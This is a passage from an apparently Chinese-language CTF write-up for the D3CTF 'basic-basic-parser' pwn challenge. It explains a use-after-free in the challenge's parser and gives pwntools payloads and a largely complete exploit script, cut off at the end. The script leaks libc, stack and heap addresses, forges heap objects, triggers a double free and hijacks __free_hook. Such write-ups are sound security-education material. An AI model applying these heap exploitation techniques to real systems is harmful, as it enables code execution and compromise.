class="line">        <span class="keyword">if</span> (next-&gt;type != LBRAC)<span class="comment">//next指向 '('</span></span><br><span class="line">        &#123;</span><br><span class="line">            WriteError(<span class="string">"missing ("</span>);</span><br><span class="line">            nnext = _get_last(nnext);</span><br><span class="line">        &#125;</span><br><span class="line">        next = I(nnext);</span><br><span class="line">        <span class="keyword">if</span> (next-&gt;type != RBRAC)</span><br><span class="line">        &#123;</span><br><span class="line">            WriteError(<span class="string">"missing )"</span>);</span><br><span class="line">            next = _get_last(next);</span><br><span class="line">        &#125;</span><br><span class="line">        nnext = _get_next(next);</span><br><span class="line">        <span class="keyword">if</span> (nnext-&gt;type != SEM)</span><br><span class="line">        &#123;</span><br><span class="line">            WriteError(<span class="string">"missing ;"</span>);</span><br><span class="line">            nnext = _get_last(nnext);</span><br><span class="line">        &#125;</span><br><span class="line">        lastProcess = nowProcess;</span><br><span class="line">        nowProcess = <span class="keyword">new</span> Process(p-&gt;name, lastProcess-&gt;getLevel() + <span class="number">1</span>);<span class="comment">//创建一个新的process</span></span><br><span class="line">        allProcess.push_back(nowProcess);<span class="comment">//压入vector中</span></span><br><span class="line">        addVar(p-&gt;name, <span class="function"><span class="keyword">FUNCTION</span>, 1)</span>;<span class="comment">//新增一个变量，类型是function</span></span><br><span class="line">        auto ret = S(_get_next(nnext));</span><br><span class="line">        <span class="keyword">if</span>(ret == _get_next(nnext))<span class="comment">//没有找到begin</span></span><br><span class="line">        &#123;</span><br><span class="line">            delete(nowProcess); </span><br><span class="line">            nowProcess = lastProcess;</span><br><span class="line">            <span class="keyword">return</span> nnext;<span class="comment">//指向 分号</span></span><br><span class="line">        &#125;</span><br><span class="line">        nowProcess = lastProcess;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(next-&gt;type == SEM)</span><br><span class="line">    &#123;</span><br><span class="line">        addVar(p-&gt;name, INTEGER);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果”integer”后面是一个用户定义的标识符(这里token_type是SYMBOL)，则会当做处理普通的变量处理:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(next-&gt;</span>type == SEM)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="title">addVar</span>(p-&gt;</span><span class="keyword">name</span>, INTEGER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>创建一个变量，然后添加到当前的Process的vars数组中.<br>如果”integer”后面是”function”的话就会处理函数声明,其对应的文法是:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">functionDec</span> -&gt;</span> <span class="string">'integer'</span> <span class="string">'function'</span> ID <span class="string">'('</span> param? <span class="string">')'</span> <span class="string">';'</span> S </span><br><span class="line"><span class="function"><span class="title">param</span> -&gt;</span> ID*</span><br></pre></td></tr></table></figure></p>
+<p>注意这里出现了问题:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lastProcess = nowProcess;</span><br><span class="line">nowProcess = <span class="keyword">new</span> Process(p-&gt;name, lastProcess-&gt;getLevel() + <span class="number">1</span>);<span class="comment">//创建一个新的process</span></span><br><span class="line">allProcess.push_back(nowProcess);<span class="comment">//压入vector中</span></span><br><span class="line">addVar(p-&gt;name, <span class="function"><span class="keyword">FUNCTION</span>, 1)</span>;<span class="comment">//新增一个变量，类型是function</span></span><br><span class="line">auto ret = S(_get_next(nnext));</span><br><span class="line"><span class="keyword">if</span>(ret == _get_next(nnext))<span class="comment">//没有找到begin</span></span><br><span class="line">&#123;</span><br><span class="line">    delete(nowProcess); </span><br><span class="line">    nowProcess = lastProcess;</span><br><span class="line">    <span class="keyword">return</span> nnext;<span class="comment">//指向 分号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里看到function后会先创建一个新的Process实例，然后将该实例压入allProcess中，再调用S函数来继续parse其函数体，如果函数体不是以”begin”开头的，则ret ==  _get_next(nnext)就会成立，即没有找到函数的主体。此时会将该新创建的Process给delete掉，但是该Process已经被压入allProcess中，这样就会造成UAF.</p>
+<p>main函数这里，每次parser解析完后，程序可以malloc一次:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">anlysisor-&gt;StartAnalysis();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"leave comment for this submit"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"size:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nnn;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; nnn;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">char</span>* comment = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(nnn &lt; <span class="number">0x200</span>)</span><br><span class="line">&#123;</span><br><span class="line">    comment = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(nnn);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"comment:"</span>;</span><br><span class="line">    read(<span class="number">0</span>,comment,nnn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这样就可以将刚才delete掉的Process给malloc掉，然后写入一些东西.</p>
+<p>然后调用DumpVar打印Process和其中的Variable:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anlysisor-&gt;dumpVar(<span class="name">cout</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>dumpVar的定义如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dumpVar</span><span class="params">(ostream &amp;stream)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p = allProcess.begin(); p != allProcess.end(); p++)<span class="comment">//遍历所有process</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> padding = <span class="string">""</span>;</span><br><span class="line">        stream &lt;&lt; (*p)-&gt;Format(padding);</span><br><span class="line">        <span class="keyword">auto</span> vars = (*p)-&gt;GetVar();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (*p)-&gt;GetNum(); i++) <span class="comment">//遍历当前process的vars</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> v = vars[i];</span><br><span class="line">            stream &lt;&lt; v-&gt;Format((*p)-&gt;getLevel(), padding);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>遍历allProcess中的Process，然后调用Format函数将其格式化，如果该Process中含有变量(即position&gt;0)，还要遍历vars数组，对每个Variable变量调用Format函数.</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>Process的数据域如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">char</span>* securt[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;    </span><br><span class="line">  Variable** vars;</span><br><span class="line">  <span class="built_in">string</span> processName;</span><br><span class="line">  <span class="keyword">int</span> level;</span><br><span class="line">  <span class="keyword">int</span> position;</span><br></pre></td></tr></table></figure></p>
+<p>后面输出Process时调用的函数是：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Format</span><span class="params">(<span class="built_in">string</span> padding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (GetName() == <span class="string">"main"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> res = padding + <span class="built_in">string</span>(securt[<span class="number">0</span>]) +  <span class="string">"Process"</span>;</span><br><span class="line">    res += padding + + <span class="string">"\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"name : "</span> + GetName() + <span class="string">"\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"type : function\n"</span>;</span><br><span class="line">    res += padding + <span class="string">"plev : "</span> + to_string(level) + <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>则可以将securt[0]给覆盖成got表项的地址，然后调用dumpVar的时候就可以泄露出libc基地址，然后再将其覆盖成envorin，泄露出stack的地址.<br>泄露出地址后，伪造vars数组，造成double free，最后劫持__free_hook即可。</p>
+<p>下面考虑的是如何泄露出heap的地址，因为我们要在heap上伪造Variable和vars数组.</p>
+<p>查看Process实例在内存中的布局:<br><img src="/2020/01/23/D3CTF-2012019-basic-basic-parser/1.png" alt=""></p>
+<p>可以看到string中的字符串指针指向的还是heap里，则可以利用部分覆写，使其指向heap地址上，然后dumpVar的时候就可以打印出heap地址.</p>
+<p>但是有个问题，Process的position成员无法覆盖成0(原来是1)，这样的话就会访问vars数组，对其中的每个Variable指针调用Format函数，而覆写的时候会覆盖掉vars数组，这样程序就会坏掉了。我的解决方法是使用栈中的残留数据当做vars数组的内容.</p>
+<p>在对Variable指针调用Format附近下个断点:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream &lt;&lt; v-&gt;Format((*p)-&gt;getLevel(), padding);</span><br></pre></td></tr></table></figure></p>
+<p>在ida中是:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v116 = Process_p[2];                      // v116 = process指针</span><br><span class="line">v117 = *(v116 + 32);                      // 获得该process中的Vars数组头指针</span><br><span class="line">if ( *(v116 + 76) &gt; 0 )</span><br><span class="line">&#123;</span><br><span class="line">  v118 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v119 = *v117;                         // 获得Variable指针</span><br><span class="line">    v301 = &amp;v302;</span><br></pre></td></tr></table></figure></p>
+<p>然后在栈中搜索已知的两个Variable指针:<br><img src="/2020/01/23/D3CTF-2012019-basic-basic-parser/2.png" alt=""></p>
+<p>找到后就可以将Process数据域中的vars覆盖成该栈地址:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_ptr = stack_addr<span class="number">-0x950</span> <span class="comment">#5c0</span></span><br><span class="line"></span><br><span class="line">payload = p64(environ_addr)securt[<span class="number">0</span>]</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>    <span class="comment"># securt[1-3]</span></span><br><span class="line">payload += p64(fake_ptr) <span class="comment">#vars</span></span><br><span class="line">payload += <span class="string">'\x98'</span><span class="comment">#string ptr</span></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>这样就可以成功泄露出heap地址，且程序不会挂掉.</p>
+<p>后续就是在heap中伪造Variable实例，然后再伪造Variable指针数组，最后将Process中的vars覆盖成指针数组的首地址</p>
+<p>Variable实例在内存中的布局如下:<br><img src="/2020/01/23/D3CTF-2012019-basic-basic-parser/3.png" alt=""><br>从上往下依次对应:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">string</span> name;    <span class="comment">// 变量的名称</span></span><br><span class="line">  <span class="keyword">char</span>* name_copy;<span class="comment">//存储变量名的另一个地方</span></span><br><span class="line">  <span class="built_in">string</span> process; <span class="comment">//该变量所处的process的名字</span></span><br><span class="line">  <span class="keyword">int</span> tpName;     <span class="comment">// 该变量的类型名称，integer 或者function..</span></span><br><span class="line">  <span class="keyword">int</span> position;   <span class="comment">// 在该变量所属的process中Vars数组中的index</span></span><br></pre></td></tr></table></figure></p>
+<p>则伪造的Variable实例和数组如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fakevars_addr = heap_addr+<span class="number">0xd28</span> <span class="comment"># 该chunk的首地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(fakevars_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">'backdoor'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fakevars_addr+<span class="number">10</span>*<span class="number">8</span>+<span class="number">0x10</span>)  <span class="comment"># backdoor will free the ptr</span></span><br><span class="line">payload += p64(fakevars_addr+<span class="number">7</span>*<span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">'backdoor'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># level position</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)<span class="comment">#fake chunk，用来double free</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(fakevars_addr)*<span class="number">2</span> <span class="comment"># 伪造的Variable指针数组 首地址为fakevars_addr+18*8</span></span><br><span class="line">comment(<span class="number">0x198</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>这里将name_copy域设置为伪造的chunk地址，且变量的名称为backdoor，这样Format函数就会调用Backdoor函数，连续free两次伪造的chunk，造成double free</p>
+<p>最后再创造一次UAF，覆盖Process的vars成员为伪造的指针数组首地址:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(environ_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>                <span class="comment"># securt[4]</span></span><br><span class="line">payload += p64(fakevars_addr+<span class="number">18</span>*<span class="number">8</span>) <span class="comment">#vars</span></span><br><span class="line">payload += p64(environ_addr)       <span class="comment">#string ptr</span></span><br><span class="line">payload += p64(<span class="number">1</span>)                  <span class="comment">#string length</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)         <span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#level</span></span><br><span class="line">payload += p32(<span class="number">2</span>) <span class="comment">#position</span></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>最后常规的tcache double free劫持free hook即可.</p>
+<p>完整exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="comment">#exec_file="./debug"</span></span><br><span class="line">exec_file=<span class="string">"./prob"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file,checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x000000000040BAF3</span></span><br><span class="line"><span class="string">    b *0x0000000000403A89</span></span><br><span class="line"><span class="string">    b *0x00000000040315F</span></span><br><span class="line"><span class="string">    b *0x406004</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script) <span class="comment"># 1 xx ,2 xx ,3 comment read , 4 find fake_ptr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(payload)</span>:</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(size,payload)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"size:\n"</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"comment:"</span>)</span><br><span class="line">    a.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUAF</span><span class="params">()</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    send(<span class="string">"begin"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    send(<span class="string">"integer function add();"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">    send(<span class="string">"end"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    send(<span class="string">"OVER"</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">getUAF()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(read_got)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>    <span class="comment"># securt[4]</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#vars</span></span><br><span class="line">payload += p64(read_got)<span class="comment">#string ptr</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment">#string length</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#level</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#position</span></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"vadr : 1\n"</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">fuck(libc_base)</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">getUAF()</span><br><span class="line"></span><br><span class="line">environ_addr = libc_base+libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">payload = p64(environ_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>    <span class="comment"># securt[4]</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#vars</span></span><br><span class="line">payload += p64(environ_addr)<span class="comment">#string ptr</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment">#string length</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#level</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#position</span></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br><span class="line">a.recvuntil(<span class="string">"vadr : 1\n"</span>)</span><br><span class="line">stack_addr=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">fuck(stack_addr)</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">getUAF()</span><br><span class="line"></span><br><span class="line">fake_ptr = stack_addr<span class="number">-0x950</span> <span class="comment">#5c0</span></span><br><span class="line">fuck(fake_ptr)</span><br><span class="line"></span><br><span class="line">payload = p64(environ_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>    <span class="comment"># securt[4]</span></span><br><span class="line">payload += p64(fake_ptr) <span class="comment">#vars</span></span><br><span class="line">payload += <span class="string">'\x98'</span><span class="comment">#string ptr</span></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br><span class="line">a.recvuntil(<span class="string">"Process\nname : "</span>)</span><br><span class="line">heap_addr = u64(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">fuck(heap_addr)</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake vars </span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">send(<span class="string">"OVER"</span>)</span><br><span class="line"></span><br><span class="line">fakevars_addr = heap_addr+<span class="number">0xd28</span></span><br><span class="line">fuck(fakevars_addr)</span><br><span class="line"></span><br><span class="line">payload = p64(fakevars_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">'backdoor'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fakevars_addr+<span class="number">10</span>*<span class="number">8</span>+<span class="number">0x10</span>)  <span 